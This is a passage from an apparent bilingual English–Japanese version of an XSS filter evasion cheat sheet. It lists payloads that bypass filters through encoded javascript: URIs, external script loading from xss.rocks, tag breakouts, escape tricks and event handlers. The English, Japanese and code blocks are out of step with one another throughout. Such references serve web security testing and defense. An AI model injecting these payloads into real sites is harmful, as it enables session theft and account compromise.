<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### エンコードされた埋め込みタブ

この手法も XSS を分断できる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```text

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS

This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XSS を分断する埋め込み改行

一部の防御側は 10 進 09 から 13 の任意の文字がこの攻撃に使えると主張するが、それは正しくない。動作するのは 09 (水平タブ)、10 (改行)、13 (キャリッジリターン) だけである。参考として [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) を確認すること。次の 4 つの XSS 攻撃例がこのベクタを示している。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```text

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Example 4: Non-alpha-non-digit XSS

The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\\&lt;SCRIPT\\\\s` != `\\&lt;SCRIPT/XSS\\\\s`:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 例 1: 埋め込みキャリッジリターンで XSS 攻撃を分断する

注: 上記では、本来より長い文字列にしている。ゼロは省略できるためである。フィルタが 16 進や 10 進エンコードを 2 文字または 3 文字でなければならないと仮定している例をよく見てきたが、実際の規則は 1 から 7 文字である。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 例 2: NULL で JavaScript ディレクティブを分断する

NULL 文字も XSS ベクタとして機能するが、上記と同じではない。Burp Proxy のようなツールで直接注入するか、URL 文字列で `%00` を使う必要がある。独自のインジェクションツールを書く場合は、vim で `^V^@` を使うと NULL を生成できる。また、次のプログラムでテキストファイルに生成できる。NULL 文字 `%00` ははるかに有用であり、この例の変種で実際のフィルタを迂回する助けになった。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```text

```bash
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>;"' > out
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 例 3: 画像 XSS における JavaScript の前のスペースとメタ文字

これは、フィルタのパターンマッチが `javascript:` という語の中のスペースを考慮していない場合に有用である。その語中のスペースはレンダリングされないため正しいが、引用符と `javascript:` キーワードの間にスペースを入れられないと誤って仮定している。実際には、10 進 1 から 32 の任意の文字を入れられる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Extraneous Open Brackets

This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 例 4: 英数字以外による XSS

Firefox の HTML パーサは、HTML キーワードの後に英数字以外があると有効ではないとみなし、HTML タグ後の空白または無効なトークンとして扱う。問題は、一部の XSS フィルタが、探しているタグは空白で分断されると仮定している点である。たとえば `\\&lt;SCRIPT\\\\s` は `\\&lt;SCRIPT/XSS\\\\s` と等しくない。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```text

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Submitted by Franz Sedlmaier)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

上記と同じ考え方に基づき、Rsnake の fuzzer を使って発展させたものである。Gecko レンダリングエンジンでは、イベントハンドラと等号の間に、文字、数字、引用符や山括弧などの囲み文字以外の任意の文字を許可するため、クロスサイトスクリプティングブロックを迂回しやすくなる。ここに示すように、グレイヴアクセント文字にも適用される。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### No Closing Script Tags

With Firefox, you don't actually need the `\\>&lt;/SCRIPT&gt;` portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

Yair Amit は、Trident (IE) と Gecko (Firefox) のレンダリングエンジンの間に少し異なる挙動があり、タグとパラメータの間に空白なしでスラッシュだけを置けることを指摘した。システムが空白を許可しない場合、この攻撃で有用になり得る。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```text

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Protocol Resolution in Script Tags

This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The `.j` is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 余分な開始山括弧

この XSS ベクタは、開始・終了山括弧の対応を確認してから中のタグを比較する検出エンジンを破れる可能性がある。これは、もちろん難読化解除後に、開始山括弧と関連タグの文字列全体を探す [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) のような効率的なアルゴリズムとは異なる。二重スラッシュは末尾の余分な括弧をコメントアウトし、JavaScript エラーを抑制する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT SRC=//xss.rocks/.j>
```text

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Submitted by Łukasz Pilorz)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(Franz Sedlmaier による投稿。)

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Half Open HTML/JavaScript XSS Vector

Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the `javascript:` directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close `\\>` tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: `/((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/` because it doesn't require the end `\\>`. As a side note, this was also affective against a real world XSS filter using an open ended `&lt;IFRAME` tag instead of an `&lt;IMG` tag.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 閉じ script タグなし

Firefox では、この XSS ベクタの `\\>&lt;/SCRIPT&gt;` 部分は実際には不要である。Firefox は HTML タグを閉じても安全だと仮定し、閉じタグを追加するためである。Firefox に影響しない次の攻撃とは異なり、この方法では下に追加の HTML を必要としない。必要であれば引用符を追加できるが、通常は不要である。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```text

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Escaping JavaScript Escapes

If an application is written to output some user information inside of a JavaScript (like the following: `&lt;SCRIPT>var a="$ENV&#123;QUERY\\_STRING&#125;";&lt;/SCRIPT&gt;`) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read `&lt;SCRIPT>var a="\\\\\\\\";alert('XSS');//";&lt;/SCRIPT&gt;` which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Script タグ内のプロトコル解決

この変種は、下記の Ozh によるプロトコル解決バイパスに一部基づいており、IE と互換モードの Edge で動作する。スペースが問題になる場所で特に有用であり、もちろんドメインが短いほどよい。ブラウザは SCRIPT タグの文脈で理解するため、エンコード種別に関係なく `.j` は有効である。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
\";alert('XSS');//
```text

```html
<SCRIPT SRC=//xss.rocks/.j>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(Łukasz Pilorz による投稿。)

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
</script><script>alert('XSS');</script>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### End Title Tag

This is a simple XSS vector that closes `&lt;TITLE>` tags, which can encapsulate the malicious cross site scripting attack:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 半開き HTML/JavaScript XSS ベクタ

Firefox とは異なり、IE のレンダリングエンジン (Trident) はページに余分なデータを追加しないが、画像内の `javascript:` ディレクティブを許可する。このベクタは閉じ山括弧を必要としないため有用である。これは、この XSS ベクタを注入する位置の下に何らかの HTML タグが存在することを前提にしている。閉じ `>` タグがなくても、下にあるタグがそれを閉じる。注記として、下にある HTML によっては HTML が壊れる。

次のネットワーク侵入検知システム (NIDS) 正規表現 `/((\\%3D)|(=))\\[^\\n\\]\\*((\\%3C)|\\<)\\[^\\n\\]+((\\%3E)|\\>)/` を迂回する。末尾の `>` を必要としないためである。補足すると、これは実環境の XSS フィルタに対し、`&lt;IMG` タグではなく開いたままの `&lt;IFRAME` タグを使う形でも有効だった。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```text

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### INPUT Image

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### JavaScript エスケープのエスケープ

アプリケーションがユーザー情報を JavaScript 内に出力するように書かれている場合、たとえば `&lt;SCRIPT>var a="$ENV&#123;QUERY\\_STRING&#125;";&lt;/SCRIPT&gt;` のような形で、そこへ独自の JavaScript を注入したいがサーバ側アプリケーションが特定の引用符をエスケープする場合、そのエスケープ文字自体をエスケープすることで回避できる。これが注入されると `&lt;SCRIPT>var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;` と読まれ、二重引用符のエスケープが解除されて XSS ベクタが発火する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```text

```javascript
\";alert('XSS');//
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### BODY Image

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

埋め込みデータに正しい JSON または JavaScript エスケープが適用されているが HTML エンコーディングがされていない場合の代替手段は、script ブロックを終了して独自のブロックを開始することである。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```text

```html
</script><script>alert('XSS');</script>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### IMG Dynsrc

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### title タグの終了

これは `&lt;TITLE>` タグを閉じる単純な XSS ベクタであり、悪意のあるクロスサイトスクリプティング攻撃を包み込める。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG DYNSRC="javascript:alert('XSS')">
```text

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### IMG Lowsrc

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### INPUT Image

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG LOWSRC="javascript:alert('XSS')">
```text

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### List-style-image

This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### BODY Image

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```text

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### VBscript in an Image

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### IMG Dynsrc

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```text

```html
<IMG DYNSRC="javascript:alert('XSS')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### SVG Object Tag

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### IMG Lowsrc

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<svg/onload=alert('XSS')>
```text

```html
<IMG LOWSRC="javascript:alert('XSS')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### ECMAScript 6

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### List-style-image

この難解な攻撃は、箇条書きリスト用の画像埋め込みに注目する。JavaScript ディレクティブに依存するため IE レンダリングエンジンでのみ動作する。特に有用な XSS ベクタではない。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
Set.constructor`alert\x28document.domain\x29
```text

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### BODY Tag

This attack doesn't require using any variants of `javascript:` or `&lt;SCRIPT...` to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (`onload=` != `onload =`):

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 画像内の VBscript

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<BODY ONLOAD=alert('XSS')>
```text

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Attacks Using Event Handlers

The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.

The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).

- `onAbort()` (when user aborts the loading of an image)
- `onActivate()` (when object is set as the active element)
- `onAfterPrint()` (activates after user prints or previews print job)
- `onAfterUpdate()` (activates on data object after updating data in the source object)
- `onBeforeActivate()` (fires before the object is set as the active element)
- `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
- `onBeforeCut()` (attacker executes the attack string right before a selection is cut)
- `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)
- `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
- `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand("Paste")` function)
- `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand("Print")` function).
- `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
- `onBeforeUpdate()` (activates on data object before updating data in the source object)
- `onBegin()` (the onbegin event fires immediately when the element's timeline begins)
- `onBlur()` (in the case where another popup is loaded and window looses focus)
- `onBounce()` (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
- `onCellChange()` (fires when data changes in the data provider)
- `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)
- `onClick()` (someone clicks on a form)
- `onContextMenu()` (user would need to right click on attack area)
- `onControlSelect()` (fires when the user is about to make a control selection of the object)
- `onCopy()` (user needs to copy something or it can be exploited using the `execCommand("Copy")` command)
- `onCut()` (user needs to copy something or it can be exploited using the `execCommand("Cut")` command)
- `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)
- `onDataSetChanged()` (fires when the data set exposed by a data source object changes)
- `onDataSetComplete()` (fires to indicate that all data is available from the data source object)
- `onDblClick()` (user double-clicks a form element or a link)
- `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)
- `onDrag()` (requires that the user drags an object)
- `onDragEnd()` (requires that the user drags an object)
- `onDragLeave()` (requires that the user drags an object off a valid location)
- `onDragEnter()` (requires that the user drags an object into a valid location)
- `onDragOver()` (requires that the user drags an object into a valid location)
- `onDragDrop()` (user drops an object (e.g. file) onto the browser window)
- `onDragStart()` (occurs when user starts drag operation)
- `onDrop()` (user drops an object (e.g. file) onto the browser window)
- `onEnd()` (the onEnd event fires when the timeline ends.
- `onError()` (loading of a document or image causes an error)
- `onErrorUpdate()` (fires on a data bound object when an error occurs while updating the associated data in the data source object)
- `onFilterChange()` (fires when a visual filter completes state change)
- `onFinish()` (attacker can create the exploit when marquee is finished looping)
- `onFocus()` (attacker executes the attack string when the window gets focus)
- `onFocusIn()` (attacker executes the attack string when window gets focus)
- `onFocusOut()` (attacker executes the attack string when window looses focus)
- `onHashChange()` (fires when the fragment identifier part of the document's current address changed)
- `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)
- `onInput()` (the text content of an element is changed through the user interface)
- `onKeyDown()` (user depresses a key)
- `onKeyPress()` (user presses or holds down a key)
- `onKeyUp()` (user releases a key)
- `onLayoutComplete()` (user would have to print or print preview)
- `onLoad()` (attacker executes the attack string after the window loads)
- `onLoseCapture()` (can be exploited by the `releaseCapture()` method)
- `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)
- `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
- `onMessage()` (fire when the document received a message)
- `onMouseDown()` (the attacker would need to get the user to click on an image)
- `onMouseEnter()` (cursor moves over an object or area)
- `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)
- `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)
- `onMouseOver()` (cursor moves over an object or area)
- `onMouseUp()` (the attacker would need to get the user to click on an image)
- `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)
- `onMove()` (user or attacker would move the page)
- `onMoveEnd()` (user or attacker would move the page)
- `onMoveStart()` (user or attacker would move the page)
- `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)
- `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)
- `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)
- `onPaste()` (user would need to paste or attacker could use the `execCommand("Paste")` function)
- `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
- `onPopState()` (fires when user navigated the session history)
- `onPropertyChange()` (user or attacker would need to change an element property)
- `onReadyStateChange()` (user or attacker would need to change an element property)
- `onRedo()` (user went forward in undo transaction history)
- `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
- `onReset()` (user or attacker resets a form)
- `onResize()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
- `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
- `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `&lt;SCRIPT>self.resizeTo(500,400);&lt;/SCRIPT&gt;`)
- `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
- `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
- `onRowsEnter()` (user or attacker would need to change a row in a data source)
- `onRowExit()` (user or attacker would need to change a row in a data source)
- `onRowDelete()` (user or attacker would need to delete a row in a data source)
- `onRowInserted()` (user or attacker would need to insert a row in a data source)
- `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
- `onSeek()` (the `onReverse` event fires when the timeline is set to play in any direction other than forward)
- `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
- `onStart()` (fires at the beginning of each marquee loop)
- `onStop()` (user would need to press the stop button or leave the webpage)
- `onStorage()` (storage area changed)
- `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)
- `onSubmit()` (requires attacker or user submits a form)
- `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
- `onTrackChange()` (user or attacker changes track in a playList)
- `onUndo()` (user went backward in undo transaction history)
- `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)
- `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
- `seekSegmentTime()` (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### SVG Object タグ

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<svg/onload=alert('XSS')>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### BGSOUND

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### ECMAScript 6

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<BGSOUND SRC="javascript:alert('XSS');">
```text

```javascript
Set.constructor`alert\x28document.domain\x29
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### & JavaScript includes

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### BODY タグ

この攻撃は、XSS 攻撃を実現するために `javascript:` や `&lt;SCRIPT...` の変種を使う必要がない。Dan Crowley は、等号の前にスペースを置けることを指摘している (`onload=` と `onload =` は異なる)。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<BR SIZE="&{alert('XSS')}">
```text

```html
<BODY ONLOAD=alert('XSS')>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### STYLE sheet

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### イベントハンドラを使った攻撃

BODY タグによる攻撃は、上記と似た XSS 攻撃で使えるように変更できる。執筆時点では、この一覧はネット上で最も包括的なものとされている。HTML+TIME の更新について Rene Ledosquet に謝意を示す。

[Dottoro Web Reference](http://help.dottoro.com/) にも JavaScript イベントの優れた [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php) がある。

次のイベントハンドラは、ブラウザや要素の状態変化、ユーザー操作、データ更新、メディア再生、履歴操作、フォーム送信などを契機に攻撃文字列を実行する候補になる。括弧内の説明は原文の発火条件を要約したものである。

- `onAbort()` (画像読み込みをユーザーが中止したとき)
- `onActivate()` (オブジェクトがアクティブ要素に設定されたとき)
- `onAfterPrint()` (印刷または印刷プレビュー後)
- `onAfterUpdate()` (ソースオブジェクトのデータ更新後)
- `onBeforeActivate()` (アクティブ要素に設定される前)
- `onBeforeCopy()` / `onCopy()` (選択範囲のコピー直前またはコピー時。`execCommand("Copy")` で悪用可能)
- `onBeforeCut()` / `onCut()` (選択範囲の切り取り直前または切り取り時)
- `onBeforeDeactivate()` / `onDeactivate()` (アクティブ要素が変わるとき)
- `onBeforeEditFocus()` (編集可能要素が UI でアクティブ化される前)
- `onBeforePaste()` / `onPaste()` (貼り付け時。`execCommand("Paste")` で強制される場合がある)
- `onBeforePrint()` (印刷前。`print()` や `execCommand("Print")` で誘発可能)
- `onBeforeUnload()` / `onUnload()` (ブラウザやページの終了・遷移時)
- `onBeforeUpdate()` / `onErrorUpdate()` (データ更新の前または更新エラー時)
- `onBegin()` / `onEnd()` / `onRepeat()` / `onResume()` / `onReverse()` / `onSeek()` / `onTimeError()` (HTML+TIME などのタイムライン制御時)
- `onBlur()` / `onFocus()` / `onFocusIn()` / `onFocusOut()` (ウィンドウや要素のフォーカス変化時)
- `onBounce()` / `onFinish()` / `onStart()` (marquee の移動やループ状態に応じて発火)
- `onCellChange()` / `onDataAvailable()` / `onDataSetChanged()` / `onDataSetComplete()` (データプロバイダやデータセットの変化時)
- `onChange()` / `onInput()` / `onPropertyChange()` / `onReadyStateChange()` (入力値、テキスト内容、プロパティ、readyState の変化時)
- `onClick()` / `onDblClick()` / `onContextMenu()` / `onMouseDown()` / `onMouseUp()` / `onMouseEnter()` / `onMouseLeave()` / `onMouseMove()` / `onMouseOut()` / `onMouseOver()` / `onMouseWheel()` (クリック、右クリック、マウス移動やホバー、ホイール操作時)
- `onControlSelect()` / `onSelect()` / `onSelectionChange()` / `onSelectStart()` (制御選択やテキスト選択時。`window.document.execCommand("SelectAll");` で初期化可能)
- `onDrag()` / `onDragStart()` / `onDragEnter()` / `onDragOver()` / `onDragLeave()` / `onDragEnd()` / `onDragDrop()` / `onDrop()` (ドラッグアンドドロップ操作時)
